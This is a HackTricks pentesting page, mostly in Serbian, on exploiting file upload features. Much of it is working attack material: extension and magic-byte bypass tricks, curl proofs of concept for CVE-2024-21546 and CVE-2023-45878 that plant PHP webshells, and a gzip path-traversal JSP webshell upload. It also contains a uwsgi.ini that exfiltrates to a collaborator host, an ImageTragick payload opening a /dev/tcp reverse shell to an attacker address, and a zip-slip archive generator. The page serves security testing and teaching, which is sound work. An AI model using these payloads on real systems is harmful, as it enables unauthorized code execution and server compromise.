# Otpremanje fajlova

{{#include ../../banners/hacktricks-training.md}}

## Opšta metodologija za otpremanje fajlova

Other useful extensions:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Zaobilaženje provera ekstenzija fajlova

1. Ako važe, **proverite** **prethodne ekstenzije.** Takođe testirajte koristeći neka **velika slova**: _pHp, .pHP5, .PhAr ..._
2. _Proverite **dodavanje validne ekstenzije pre** izvršne ekstenzije (koristite i prethodne ekstenzije):_
- _file.png.php_
- _file.png.Php5_
3. Pokušajte dodati **posebne karaktere na kraju.** Možete koristiti Burp da **bruteforcuje** sve **ascii** i **Unicode** karaktere. (_Napomena da možete koristiti i ranije pomenute **ekstenzije**_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Pokušajte zaobići zaštite **zavaravanjem parsera ekstenzije** na server strani koristeći tehnike kao što su **dupliranje** **ekstenzije** ili **dodavanje smeća** (**null** bajtovi) između ekstenzija. _Takođe možete koristiti **prethodne ekstenzije** da pripremite bolji payload._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Dodajte **još jedan nivo ekstenzija** u prethodnu proveru:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Pokušajte staviti **exec ekstenziju pre validne ekstenzije** i nadate se da je server pogrešno konfigurisan. (korisno za iskorišćavanje Apache miskonfiguracija gde će bilo šta sa ekstenzijom **.php**, ali **ne nužno završavajući sa .php**, izvršavati kod):
- _ex: file.php.png_
7. Korišćenje **NTFS alternate data stream (ADS)** na **Windows**. U tom slučaju, karakter dvotačke ":" biće ubacen posle zabranjene ekstenzije i pre dozvoljene. Kao rezultat, na serveru će biti kreiran **prazan fajl sa zabranjenom ekstenzijom** (npr. "file.asax:.jpg”). Ovaj fajl može kasnije biti izmenjen drugim tehnikama kao što je korišćenje njegovog short filename. Pattern "**::$data**” se takođe može koristiti za kreiranje ne-praznih fajlova. Dakle, dodavanje tačke posle ovog pattern-a takođe može biti korisno za zaobilaženje daljih ograničenja (npr. "file.asp::$data.”)
8. Pokušajte preći granicu za ime fajla. Validna ekstenzija se odsiječe. Maliciozni PHP ostane. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

Neki upload handler-i skraćuju ili normalizuju trailing tačke iz sačuvanog imena fajla. U UniSharp’s Laravel Filemanager (unisharp/laravel-filemanager) verzijama pre 2.9.1, možete zaobići validaciju ekstenzije na sledeći način:

- Koristeći validan image MIME i magic header (npr. PNG-ov `\x89PNG\r\n\x1a\n`).
- Imenovanjem otpremljenog fajla sa PHP ekstenzijom praćenom tačkom, npr. `shell.php.`.
- Server ukloni trailing tačku i sačuva `shell.php`, koji će se izvršiti ako je postavljen u direktorijum koji služi fajlove vebu (default public storage kao što je `/storage/files/`).

Minimalni PoC (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
Zatim pristupi sačuvanoj putanji (tipično u Laravel + LFM):
```
GET /storage/files/0xdf.php?cmd=id
```
Ublažavanja:
- Ažurirajte unisharp/laravel-filemanager na ≥ 2.9.1.
- Primena stroge server-side liste dozvoljenih (allowlists) i ponovna validacija sačuvanog imena fajla.
- Poslužujte upload-ovane fajlove iz neizvršnih direktorijuma.

### Zaobilaženje Content-Type, Magic Number, Compression & Resizing

- Zaobiđite **Content-Type** provere tako što ćete postaviti **vrednost** **Content-Type** **header**-a na: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Zaobiđite proveru **magic number** dodavanjem na početak fajla **bajtova prave slike** (zbunite _file_ komandu). Ili ubacite shell u **metadata**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` ili možete takođe **ubaciti payload direktno** u sliku:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- Ako se na vašu sliku primenjuje **kompresija**, na primer koristeći neke standardne PHP biblioteke kao što je [PHP-GD](https://www.php.net/manual/fr/book.image.php), prethodne tehnike možda neće biti korisne. Međutim, možete koristiti **PLTE chunk** [**tehniku definisanu ovde**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) da ubacite tekst koji će **preživeti kompresiju**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- Web stranica takođe može da **menja veličinu** slike, koristeći na primer PHP-GD funkcije `imagecopyresized` ili `imagecopyresampled`. Međutim, možete koristiti **IDAT chunk** [**tehniku definisanu ovde**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) da ubacite tekst koji će **preživeti kompresiju**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Još jedna tehnika za kreiranje payload-a koji **preživi promenu veličine slike**, koristeći PHP-GD funkciju `thumbnailImage`. Međutim, možete koristiti **tEXt chunk** [**tehniku definisanu ovde**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) da ubacite tekst koji će **preživeti kompresiju**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Ostali trikovi za proveru

- Pronađite ranjivost koja omogućava **preimenovanje** fajla koji je već upload-ovan (da promenite ekstenziju).
- Pronađite **Local File Inclusion** ranjivost da izvršite backdoor.
- **Moguće otkrivanje informacija**:
1. Upload-ujte **isti fajl** **više puta** (i u **isto vreme**) sa **istim imenom**
2. Upload-ujte fajl sa **imenom** fajla ili **foldera** koji već postoji
3. Upload-ovanje fajla sa imenom `"."`, `".."`, ili `"…"` . Na primer, na Apache-u u **Windows**, ako aplikacija čuva upload-ovane fajlove u "/www/uploads/" direktorijumu, ime fajla "." će kreirati fajl nazvan
uploads” u "/www/" direktorijumu.
4. Upload-ujte fajl koji možda neće biti lako obrisan, kao na primer **"…:.jpg"** u **NTFS**. (Windows)
5. Upload-ujte fajl u **Windows** sa **nevažećim karakterima** kao što su `|<>*?”` u imenu. (Windows)
6. Upload-ujte fajl u **Windows** koristeći **rezervisana** (**zabranjena**) **imena** kao što su CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, i LPT9.
- Pokušajte takođe da **upload-ujete izvršni fajl** (.exe) ili **.html** (manje sumnjivo) koji će **izvršiti kod** kada ga žrtva slučajno otvori.

### Special extension tricks

Ako pokušavate da upload-ujete fajlove na **PHP server**, [take a look at the **.htaccess** trick to execute code](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
Ako pokušavate da upload-ujete fajlove na **ASP server**, [take a look at the **.config** trick to execute code](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

Fajlovi `.phar` su kao `.jar` za java, ali za php, i mogu se **koristiti kao php fajl** (izvršavajući ih sa php, ili uključujući ih unutar skripte...).

Ekstenzija `.inc` se ponekad koristi za php fajlove koji služe samo za **import fajlova**, tako da je moguće da je na nekom mestu dozvoljeno **izvršavanje ove ekstenzije**.

## **Jetty RCE**

Ako možete da upload-ujete XML fajl na Jetty server možete dobiti [RCE because **new *.xml and *.war are automatically processed**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Dakle, kao što je prikazano na sledećoj slici, upload-ujte XML fajl u `$JETTY_BASE/webapps/` i očekujte shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

Za detaljno istraživanje ove ranjivosti pogledajte originalno istraživanje: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) ranjivosti se mogu iskoristiti na uWSGI serverima ako napadač ima mogućnost da izmeni `.ini` konfiguracioni fajl. uWSGI konfiguracioni fajlovi koriste specifičnu sintaksu za uključivanje "magic" varijabli, placeholder-a i operatora. Posebno, '@' operator, korišćen kao `@(filename)`, je dizajniran da uključi sadržaj fajla. Među različitim podržanim šemama u uWSGI-ju, "exec" šema je posebno moćna jer omogućava čitanje podataka iz standardnog izlaza procesa. Ova funkcionalnost se može manipulirati u zlonamerne svrhe kao što su Remote Command Execution ili Arbitrary File Write/Read kada se `.ini` konfiguracioni fajl procesuira.

Razmotrite sledeći primer zlonamernog `uwsgi.ini` fajla, koji prikazuje različite sheme:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Izvršenje payload-a se dešava tokom parsiranja konfiguracionog fajla. Da bi konfiguracija bila aktivirana i parsirana, uWSGI proces mora biti restartovan (potencijalno nakon pada ili zbog Denial of Service napada) ili fajl mora biti podešen na auto-reload. Auto-reload funkcija, ako je omogućena, ponovo učitava fajl u zadatim intervalima kad detektuje promene.

Ključno je razumeti popustljivost parsiranja konfiguracionih fajlova uWSGI-ja. Konkretno, pomenuti payload može biti ubačen u binarni fajl (kao što je slika ili PDF), što dodatno proširuje mogućnosti iskorišćavanja.

### Gibbon LMS arbitrary file write to pre-auth RCE (CVE-2023-45878)

Neautentifikovani endpoint u Gibbon LMS omogućava arbitrary file write unutar web root-a, što dovodi do pre-auth RCE ubacivanjem PHP fajla. Ranljive verzije: do i uključujući 25.0.01.

- Endpoint: `/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`
- Method: POST
- Required params:
- `img`: data-URI-like string: `[mime];[name],[base64]` (server ignoriše tip/ime, base64-dekoduje ostatak)
- `path`: destination filename relative to Gibbon install dir (e.g., `poc.php` or `0xdf.php`)
- `gibbonPersonID`: bilo koja neprazna vrednost je prihvaćena (npr., `0000000001`)

Minimalni PoC za upis i čitanje fajla:
```bash
# Prepare test payload
printf '0xdf was here!' | base64
# => MHhkZiB3YXMgaGVyZSEK

# Write poc.php via unauth POST
curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;test,MHhkZiB3YXMgaGVyZSEK&path=poc.php&gibbonPersonID=0000000001'

# Verify write
curl http://target/Gibbon-LMS/poc.php
```
Otpremite minimalan webshell i izvršite komande:
```bash
# '<?php system($_GET["cmd"]); ?>' base64
# PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==

curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;foo,PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==&path=shell.php&gibbonPersonID=0000000001'

curl 'http://target/Gibbon-LMS/shell.php?cmd=whoami'
```
Napomene:
- Handler izvršava `base64_decode($_POST["img"])` nakon splitovanja po `;` i `,`, zatim upisuje bajtove u `$absolutePath . '/' . $_POST['path']` bez validacije ekstenzije/tipa.
- Rezultujući kod se izvršava kao korisnik web servisa (npr. XAMPP Apache na Windows).

References for this bug include the usd HeroLab advisory and the NVD entry. See the References section below.

## **wget File Upload/SSRF Trick**

U nekim slučajevima možete otkriti da server koristi **`wget`** za **download files** i da možete navesti **URL**. U tim situacijama, kod može proveravati da li je ekstenzija preuzetih fajlova na whitelisti kako bi se osiguralo da će biti preuzeti samo dozvoljeni fajlovi. Međutim, **this check can be bypassed.**\
The **maximum** length of a **filename** in **linux** is **255**, however, **wget** truncate the filenames to **236** characters. You can **download a file called "A"*232+".php"+".gif"**, this filename will **bypass** the **check** (as in this example **".gif"** is a **valid** extension) but `wget` will **rename** the file to **"A"*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Imajte na umu da **još jedna opcija** o kojoj možda razmišljate da zaobiđete ovu proveru jeste da naterate **HTTP server da preusmeri na drugi fajl**, tako da početni URL prođe proveru, ali će wget preuzeti preusmereni fajl pod novim imenom. Ovo **neće raditi** **osim ako** wget nije pokrenut sa **parametrom** `--trust-server-names` jer **wget će preuzeti preusmerenu stranicu pod imenom fajla naznačenim u originalnom URL-u**.

### Prevazilaženje upload direktorijuma pomoću NTFS junctions (Windows)

(Za ovaj napad biće vam potreban lokalni pristup Windows mašini) Kada se upload-i čuvaju u podfolderima po korisniku na Windows-u (npr., C:\Windows\Tasks\Uploads\<id>\) i ako imate kontrolu nad kreiranjem/brisanjem tog podfoldera, možete ga zameniti directory junction-om koji pokazuje na osetljivu lokaciju (npr., webroot). Naknadni upload-i će biti upisani u ciljnu putanju, što omogućava izvršavanje koda ako cilj tumači kod na serverskoj strani.

Primer toka za preusmeravanje upload-a u XAMPP webroot:
```cmd
:: 1) Upload once to learn/confirm your per-user folder name (e.g., md5 of form fields)
::    Observe it on disk: C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882

:: 2) Remove the created folder and create a junction to webroot
rmdir C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882
cmd /c mklink /J C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882 C:\xampp\htdocs

:: 3) Re-upload your payload; it lands under C:\xampp\htdocs
::    Minimal PHP webshell for testing
::    <?php echo shell_exec($_REQUEST['cmd']); ?>

:: 4) Trigger
curl "http://TARGET/shell.php?cmd=whoami"
```
Notes
- mklink /J creates an NTFS directory junction (reparse point). Nalog web servera mora da sledi junction i imati dozvolu za pisanje na destinaciji.
- Ovo preusmerava proizvoljna pisanja fajlova; ako destinacija izvršava skripte (PHP/ASP), to postaje RCE.
- Odbrane: ne dozvoljavajte da writable upload roots budu pod kontrolom napadača ispod C:\Windows\Tasks ili slično; blokirajte kreiranje junction-a; validirajte ekstenzije na serverskoj strani; čuvajte uploads na zasebnom volumenu ili koristite deny‑execute ACLs.

### GZIP-compressed body upload + path traversal in destination param → JSP webshell RCE (Tomcat)

Neki upload/ingest handleri zapisuju raw request body na putanju u fajl sistemu koja se konstruiše iz query parametara kojima korisnik upravlja. Ako handler takođe podržava Content-Encoding: gzip i ne kanonizuje/validira destination path, možete kombinovati path traversal sa gzipped payload‑om da zapišete proizvoljne bajtove u direktorijum koji služi web i dobijete RCE (npr. ubacite JSP u Tomcat-ove webapps).

Generic exploitation flow:
- Pripremite server-side payload (npr. minimalni JSP webshell) i gzip-kompresujte bajtove.
- Pošaljite POST gde path parameter (npr. token) sadrži traversal koji izlazi iz predviđenog foldera, a file ukazuje na ime fajla koje treba sačuvati. Podesite Content-Type: application/octet-stream i Content-Encoding: gzip; body je kompresovani payload.
- Otvorite upisani fajl u browseru da pokrenete izvršenje.

Illustrative request:
```http
POST /fileupload?token=..%2f..%2f..%2f..%2fopt%2ftomcat%2fwebapps%2fROOT%2Fjsp%2F&file=shell.jsp HTTP/1.1
Host: target
Content-Type: application/octet-stream
Content-Encoding: gzip
Content-Length: <len>

<gzip-compressed-bytes-of-your-jsp>
```
Zatim pokrenite:
```http
GET /jsp/shell.jsp?cmd=id HTTP/1.1
Host: target
```
Napomene
- Ciljne putanje variraju u zavisnosti od instalacije (npr., /opt/TRUfusion/web/tomcat/webapps/trufusionPortal/jsp/ u nekim stackovima). Bilo koji web-izložen folder koji izvršava JSP će raditi.
- Burp Suite’s Hackvertor extension može da proizvede ispravno gzip telo iz tvog payload-a.
- Ovo je čisti pre-auth arbitrary file write → RCE obrazac; ne oslanja se na multipart parsing.

Mitigacije
- Određujte destinacije za upload na serveru; nikad ne verujte fragmentima putanje koje dolaze od klijenata.
- Canonicalizujte i osigurajte da rešena putanja ostane unutar dozvoljenog (allow-listed) osnovnog direktorijuma.
- Skladištite upload-ove na neizvršnom volumenu i zabranite izvršavanje skripti iz zapisivih (writable) putanja.

## Alati

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) je moćan alat dizajniran da pomogne Pentesters and Bug Hunters u testiranju file upload mehanizama. Koristi različite bug bounty tehnike da pojednostavi proces identifikovanja i eksploatisanja ranjivosti, obezbeđujući temeljne procene web aplikacija.

### Kvarenje upload indeksa zbog snprintf čudnosti (istorijsko)

Neki legacy upload handler-i koji koriste `snprintf()` ili slične funkcije za izgradnju multi-file nizova iz single-file uploada mogu biti prevareni da falsifikuju `_FILES` strukturu. Zbog nekonzistentnosti i trunciranja u ponašanju `snprintf()`, pažljivo napravljen single upload može izgledati kao više indeksiranih fajlova na serverskoj strani, zbunjujući logiku koja pretpostavlja striktan oblik (npr. tretira ga kao multi-file upload i bira nesigurne grane). Iako je danas nišne prirode, ovaj “index corruption” obrazac povremeno se ponovo pojavljuje u CTF-ovima i starijim kod bazama.

## From File upload to other vulnerabilities

- Set **filename** to `../../../tmp/lol.png` and try to achieve a **path traversal**
- Set **filename** to `sleep(10)-- -.jpg` and you may be able to achieve a **SQL injection**
- Set **filename** to `<svg onload=alert(document.domain)>` to achieve a XSS
- Set **filename** to `; sleep 10;` to test some command injection (more [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Probajte **different svg payloads** from [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- Ako možete naložiti web serveru da preuzme (catch) sliku sa URL-a, možete pokušati da zloupotrebite [SSRF](../ssrf-server-side-request-forgery/index.html). Ako će ta **image** biti **saved** na nekom **public** sajtu, možete navesti URL sa [https://iplogger.org/invisible/](https://iplogger.org/invisible/) i **steal information of every visitor**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- Posebno oblikovani PDFs za XSS: The [following page present how to **inject PDF data to obtain JS execution**](../xss-cross-site-scripting/pdf-injection.md). Ako možete upload-ovati PDFs možete pripremiti neki PDF koji će izvršiti proizvoljan JS prateći date instrukcije.
- Upload-ujte sadržaj \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) da proverite da li server ima neki **antivirus**
- Proverite da li postoji neki **size limit** pri uploadovanju fajlova

Here’s a top 10 list of things that you can achieve by uploading (from [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magic Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Refer to [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) for other filetypes.

## Zip/Tar File Automatically decompressed Upload

If you can upload a ZIP that is going to be decompressed inside the server, you can do 2 things:

### Symlink

Upload a link containing soft links to other files, then, accessing the decompressed files you will access the linked files:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Dekompresovanje u različite foldere

Neočekivano kreiranje fajlova u direktorijumima tokom dekompresije predstavlja značajan problem. Iako se na prvi pogled čini da ova postavka može sprečiti OS-level command execution kroz zlonamerne otpreme fajlova, podrška za hijerarhijsko kompresovanje i directory traversal mogućnosti ZIP archive format mogu biti iskorišćene. To omogućava napadačima da zaobiđu ograničenja i pobegnu iz sigurnih direktorijuma za otpremanje manipulišući funkcionalnošću dekompresije ciljne aplikacije.

Automatizovani exploit koji kreira takve fajlove dostupan je na [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). Alat se može koristiti na sledeći način:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Pored toga, kao opcija postoji i **symlink trick with evilarc**. Ako je cilj da se pristupi fajlu poput `/flag.txt`, trebalo bi napraviti symlink ka tom fajlu na vašem sistemu. Ovo osigurava da evilarc ne naiđe na greške tokom svog rada.

Ispod je primer Python koda koji se koristi za kreiranje malicioznog zip fajla:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO


def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Zloupotreba kompresije za file spraying**

Za više detalja **pogledajte originalni post na**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**: PHP kod koji izvršava komande prosleđene preko varijable `$_REQUEST`.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: Kreira se više fajlova i sastavlja se zip arhiva koja sadrži te fajlove.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: Imena fajlova unutar zip-a se menjaju koristeći vi ili hex editor, zamenjujući "xxA" sa "../" da bi se prešlo u nadređeni direktorijum.

```bash
:set modifiable
:%s/xxA/../g
:x!
```

## ImageTragic

Otpremite ovaj sadržaj sa image ekstenzijom da biste iskoristili ranjivost **(ImageMagick , 7.0.1-1)** (iz [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Ugradnja PHP shell-a u PNG

Ugradnja PHP shell-a u IDAT chunk PNG fajla može efikasno zaobići određene operacije obrade slika. Funkcije `imagecopyresized` i `imagecopyresampled` iz PHP-GD su posebno relevantne u ovom kontekstu, jer se obično koriste za promenu veličine i resampling slika, respektivno. Sposobnost ugrađenog PHP shell-a da ostane netaknut od ovih operacija predstavlja značajnu prednost za određene upotrebe.

Detaljno istraživanje ove tehnike, uključujući metodologiju i moguće primene, dostupno je u sledećem članku: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Ovaj resurs nudi sveobuhvatno razumevanje procesa i njegovih implikacija.

Više informacija u: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot fajlovi

Polyglot fajlovi su jedinstveno sredstvo u sajber bezbednosti, ponašajući se kao kameleoni koji mogu validno postojati u više formata fajlova istovremeno. Zanimljiv primer je [GIFAR](https://en.wikipedia.org/wiki/Gifar), hibrid koji funkcioniše i kao GIF i kao RAR arhiva. Takvi fajlovi nisu ograničeni na ovo uparivanje; kombinacije poput GIF i JS ili PPT i JS su takođe moguće.

Osnovna upotrebljivost polyglot fajlova leži u njihovoj sposobnosti da zaobiđu bezbednosne mere koje filtriraju fajlove na osnovu tipa. Uobičajena praksa u raznim aplikacijama podrazumeva dozvoljavanje samo određenih tipova fajlova za upload — kao što su JPEG, GIF ili DOC — kako bi se ublažio rizik od potencijalno opasnih formata (npr. JS, PHP ili Phar fajlova). Međutim, polyglot koji zadovoljava strukturne kriterijume više tipova fajlova može prikriveno zaobići ova ograničenja.

